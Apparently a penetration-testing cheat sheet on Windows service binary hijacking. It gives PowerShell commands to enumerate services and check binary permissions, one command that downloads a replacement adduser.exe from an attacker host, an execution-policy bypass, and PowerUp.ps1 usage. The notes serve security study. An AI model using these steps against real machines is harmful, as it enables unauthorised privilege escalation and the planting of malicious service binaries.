# Binary Hijacking

## Overview

During Windows service enumeration, it is important to check whether service binaries are located in writable directories or have weak file permissions. If a service runs with elevated privileges and its binary can be replaced or modified, it may be possible to execute arbitrary code when the service is restarted. This is a common privilege escalation path in misconfigured environments.

---
Installed Applications
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
- Always check Program Files as well

Windows Service applications have read and write access to all users. View services;
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
- Services are located in C:\xampp\

Use icacls to see permissions to the service 
```
icacls "C:\xampp\mysql\bin\mysqld.exe"
```
```
 iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe
```
Now restart the service or machine 


Using PowerUp.ps1
---
Path on Linux /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
- Transfer to windows 
```
powershell -ep bypass
```
```
..\PowerUp.ps1
```
```
Get-ModifiableServiceFile
```
